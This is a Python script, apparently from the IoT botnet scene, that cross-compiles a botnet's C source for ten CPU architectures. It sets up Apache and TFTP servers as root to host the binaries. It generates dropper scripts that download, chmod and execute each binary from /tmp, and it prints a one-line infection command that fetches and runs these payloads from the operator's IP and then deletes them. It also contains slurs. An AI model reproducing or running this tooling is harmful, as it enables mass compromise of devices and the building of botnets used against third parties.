#Python Botnet Cross-Compiler 
# modded by MrScythe
# 2/1/18
# bins.sh >> mrscythe.sh
# instagram @fuckit.c

import subprocess, sys

if len(sys.argv[2]) != 0:
    ip = sys.argv[2]
else:
    print("\x1b[0;31mincorrect format!")
    print("\x1b[0;32mUsage: python " + sys.argv[0] + " <botnet.c> <ip address> \x1b[0m")
    exit(1)
    
bot = sys.argv[1]

yourafag = raw_input("Get arch's? Y/n:")
if yourafag.lower() == "y":
    get_arch = True
else:
    get_arch = False

compileas = ["GHfjfgvj", #mips
             "JIPJIPJj", #mipsel
             "jhUOH", #sh4
             "RYrydry", #x86
             "UYyuyioy", #Armv6l
             "XDzdfxzf", #i686
             "JIPJuipjh", #ppc
             "DFhxdhdf", #i586
             "FDFDHFC", #m68k
             "FTUdftui"] #sparc

getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2']

ccs = ["cross-compiler-mips",
       "cross-compiler-mipsel",
       "cross-compiler-sh4",
       "cross-compiler-x86_64",
       "cross-compiler-armv6l",
       "cross-compiler-i686",
       "cross-compiler-powerpc",
       "cross-compiler-i586",
       "cross-compiler-m68k",
       "cross-compiler-sparc"]

def run(cmd):
    subprocess.call(cmd, shell=True)

run("rm -rf /var/www/html/mrscythe.sh /var/lib/tftpboot/tftp1.sh /var/lib/tftpboot/tftp2.sh")

if get_arch == True:
    run("rm -rf cross-compiler-*")

    print("Downloading Architectures")

    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
        run("tar -xvf *tar.bz2")
        run("rm -rf *tar.bz2")

    print("Cross Compilers Downloaded...")

num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run("./"+cc+"/bin/"+arch+"-gcc -static -lpthread -pthread -D" + arch.upper() + " -o " + compileas[num] + " " + bot + " > /dev/null")
    num += 1

print("Cross Compiling Done!")
print("Setting up your httpd and tftp & updating ur shit lulz")

run("yum update -y")
run("apt-get update && apt-get upgrade -y")
run("apt-get install perl make nano screen gcc -y")
run("yum install perl make nano screen gcc -y")
run("yum install httpd -y")
run("apt-get install apache2 -y")
run("service httpd start")
run("service apache2 start")
run("yum install xinetd tftp tftp-server -y")
run("apt-get install xinetd tftp tftp-server")

run('''echo -e "# default: off

service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')
run("service xinetd start")

for i in compileas:
    run("cp " + i + " /var/www/html")
    run("mv " + i + " /var/www/html")

run('echo -e "ulimit -n 712" > /var/www/html/tftp1.sh')
run('echo -e "cp /bin/busybox /tmp/" > /var/www/html/tftp1.sh')
run('echo -e "ulimit -n 712" > /var/www/html/tftp2.sh')

for i in compileas:
    run('echo -e "cd /tmp; wget http://' + ip + '/' + i + '; chmod 777 ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/mrscythe.sh')
    run('echo -e "cd /tmp; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/www/html/tftp1.sh')
    run('echo -e "cd /tmp; tftp -r ' + ip + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/www/html/tftp2.sh')

run("service xinetd restart")
run("service httpd restart")
run("service apache2 restart")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')

print("\x1b[0;32mSuccessfully cross compiled!\x1b[0m")
print("\x1b[0;32mYour link: cd /tmp; wget http://" + ip + "/mrscythe.sh || curl -O http://" + ip + "/mrscythe.sh; chmod 777 mrscythe.sh; sh mrscythe.sh; busybox tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf mrscythe.sh tftp1.sh tftp2.sh\x1b[0m")
print
print("\x1b[0;32mReCoded by MrScythe, Fuck skids lulz\x1b[0m")



        

 
  

